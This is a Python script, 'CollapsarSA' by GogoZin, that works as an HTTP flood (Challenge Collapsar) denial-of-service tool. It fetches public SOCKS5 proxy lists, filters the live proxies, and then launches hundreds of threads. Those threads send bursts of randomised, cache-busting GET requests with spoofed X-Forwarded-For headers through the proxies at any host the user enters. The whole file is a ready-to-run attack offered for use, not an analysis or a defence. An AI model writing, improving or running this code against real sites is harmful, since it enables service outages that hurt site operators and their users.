import socks 
import socket 
import requests 
import threading 
import random 
import ssl 
import os
import sys
import time
from colorama import Fore

nums = 0
os.system("clear")
print(Fore.CYAN+"\n             '||` '||`                                      ")
print(Fore.CYAN+"              ||   ||                                       ")
print(Fore.CYAN+".|'', .|''|,  ||   ||   '''|.  '||''|, (''''  '''|.  '||''| ")
print(Fore.CYAN+"||    ||  ||  ||   ||  .|''||   ||  ||  `'') .|''||   ||    ")
print(Fore.BLUE+"`|..' `|..|' .||. .||. `|..||.  ||..|' `...' `|..||. .||.   ")
print(Fore.BLUE+"                                ||                          ")
print(Fore.BLUE+"                               .||         "+Fore.RESET)
print(Fore.WHITE + "Code By GogoZin -2019/8/21")
print("Version 1.2 \n")

def checking_socks(lines,):
    global nums
    try:
        proxy = lines.strip().split(":")
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
    except:
        lsts.remove(lines)
        return
    err = 0
    if port == 443:
        ms = 5
    else:
        ms = 5
    while True:
        if err == 3:
            lsts.remove(lines)
            break
        try:
            s = socks.socksocket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
            s.settimeout(ms)
            s.connect((str(host), int(port)))
            if port==443:
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s,server_hostname=host)
            s.send(str.encode("GET / HTTP/1.1\r\nHost: "+host+"\r\n\r\n"))
            s.close()
            break
        except:
            s.close()
            err +=1
    nums += 1

def check_socks():
    global nums
    thread_list=[]
    for lines in list(lsts):
        pro = lines.strip().split(":")
        th = threading.Thread(target=checking_socks,args=(lines,))
        th.start()
        thread_list.append(th)
        time.sleep(0.01)
        sys.stdout.write(Fore.YELLOW+"Checking "+Fore.CYAN+"["+Fore.WHITE+str(pro[0])+Fore.CYAN+"]-["+Fore.GREEN+"Connected"+Fore.CYAN+"] \n"+Fore.YELLOW+"Number "+Fore.CYAN+"["+Fore.WHITE+str(nums)+Fore.CYAN+"] \r"+Fore.RESET)
        sys.stdout.flush()
    for th in list(thread_list):
        th.join()
        sys.stdout.write(Fore.YELLOW+"Checking "+Fore.CYAN+"["+Fore.WHITE+str(pro[0])+Fore.CYAN+"]-["+Fore.GREEN+"Connected"+Fore.CYAN+"] \n"+Fore.YELLOW+"Number "+Fore.CYAN+"["+Fore.WHITE+str(nums)+Fore.CYAN+"] \r"+Fore.RESET)
        sys.stdout.flush()
    print("\r\nChecked all lsts, Total Worked:"+str(len(lsts)))
    with open("socks5.txt", 'wb') as fp:
        for lines in list(lsts):
            fp.write(bytes(lines,encoding='utf8'))
    fp.close()
    os.system("cat socks5.txt|sort -u -n -o socks5.txt")

def clone(): #Get Socks5 List
    f = open("socks5.txt","wb")
    try:
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",timeout=5)
        f.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
        f.write(r.content)
        f.close()
    except:
        f.close()
    os.system("cat socks5.txt|sort -u -n -o socks5.txt")

def atk(): #Socks Sent Requests
    proxy = random.choice(lsts).strip().split(":")
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]))
    while 1:
        try:
            s = socks.socksocket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
            s.connect((str(host), int(port)))
            try:
                for _ in range(per):
                    s.send(str("GET "+uu+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+host+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n").encode())
                    s.send(str("GET "+uu+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+host+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n").encode())
                print(Fore.CYAN + "ChallengeCollapsar From ~[" + Fore.WHITE + str(proxy[0])+":"+str(proxy[1])+ Fore.CYAN + "]") #Code By GogoZin
            except:
                s.close()
                #print(Fore.RED+"Connection Error")
        except:
            s.close()
            #print(Fore.RED+"Canʼt Connect To Socks")

if __name__=='__main__':
    host = str(input('Target (Ex. www.google.com ) : '))
    if host =='':
        input("Error Input ! Try Again")
        exit()
    port = str(input('Port (Default Is 80) : '))
    if port =='':
        port = int(80)
    thr = str(input("Threads (1-800 Default Is 300) : "))
    if thr =='':
        thr = int(300)
    else:
        thr = int(thr)
    per = str(input("CC-Power (1-100 Default Is 70) : "))
    if per =='':
        per = int(70)
    else:
        per = int(per)
    uu = str(input("Path (Default Is / ) : "))
    if uu=='':
        uu ='/'
    gt = str(input('Get List? (y/n) : '))
    if gt =='y':
        clone()
    else:
        pass
    lst = str(input('Socks5 List (socks5.txt) : '))
    if lst =='':
        lst = 'socks5.txt'
    lsts = open(lst).readlines()
    check_socks()
    print('Total Socks5 -> %d'%len(lsts))
    for _ in range(thr):
        threading.Thread(target=atk).start()
